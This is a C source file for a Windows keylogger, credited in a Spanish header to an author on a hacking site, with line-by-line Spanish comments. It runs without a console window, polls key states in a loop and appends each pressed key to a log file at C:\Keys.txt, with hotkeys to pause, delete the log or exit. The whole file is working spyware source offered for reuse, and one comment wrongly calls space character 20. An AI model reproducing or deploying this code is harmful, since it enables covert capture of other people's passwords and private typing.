#include <windows.h> /* declaramos las librerias */
#include <stdio.h>

/* _____________________________________________
   |Programa codeado 100% By Mr.Blo0D de CPH.  |
   |Para www.Yeah-Hack.es.kz                   |
   | Si quieren modificar el programa, por fa- |
   | vor, respeten el autor original y no bo-  |
   | rren estos creditos =).                   |
   |___________________________________________|
*/

FILE *ar; /* declaramos la variable ar como FILE, para poder abrir el fichero */
int dc();/* declaramos las funciones dc y ec */
int ec();
int r; /* declaramos la variable r para el for */
const int ac = -32767; /* declaramos ac como constante ya que es el valor que devuelve la API GetAsyncKeyState si una tecla esta pulsada */

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{                   
                   ec();                    
}

int dc() /* esta funcion da "largas" y deja de capturar las teclas, sin cerrar el programa, gracias al bucle INFINITO */
{
 for(;;) /* creamos un bucle INFINITO */
 {
       if(GetAsyncKeyState(VK_F8) == ac) /* si F8 es pulsado, se realiza lo siguiente */
                           {
                                                      ec(); /* llamamos a la funcion ec(empezar capturacion) */
                           }
                           Sleep(50); /* un sleep para no sobrecargar el procesador */
 }
return 0;
}

int ec()
{
    for(;;) /* creamos un bucle INFINITO */
                    {
                           if(GetAsyncKeyState(VK_F9) == ac) /* si F9 es pulsado, se realiza lo siguiente */
                           {
                                                      exit(0); /* salimos del programa */
                           }
                           
                           if(GetAsyncKeyState(VK_F10) == ac) /* si F10 es pulsado, se realiza lo siguiente */
                           {
                                                      DeleteFile("C:\\keys.txt"); /* borramos el log */
                           }
                           
                           if(GetAsyncKeyState(VK_F8) == ac) /* si F8 es pulsado, se realiza lo siguiente */
                           {
                                                    dc(); /* llamamos a la funcion dc(dejar capturacion) */
                           }
                           
                           for(r = 20 ; r <= 'Z'; r++) /* hacemos que el for recorra TODAS LAS LETRAS, pongo desde la 20 porque el espacio es el caracter nº 20 */
                           {
                                 if(GetAsyncKeyState(r) == ac) /* si alguna tecla esta siendo presionada */
                                 {
                                                         ar=fopen("C:\\Keys.txt", "a"); /* abrimos el archivo C:\\Keystxt con privilegios de escritura */
                                                         fprintf(ar, "%c", r); /* le escribimos el valor de r (la variable del for) pasado a caracter, solamente lo ponemos como char y se guarda como caracter */
                                                         fclose(ar); /* cerramos el archivo */
                                 }
                           }
                           Sleep(25); /* le ponemos un sleep para que no se sobrecargue el procesador */
                    }
                    return 0;
}
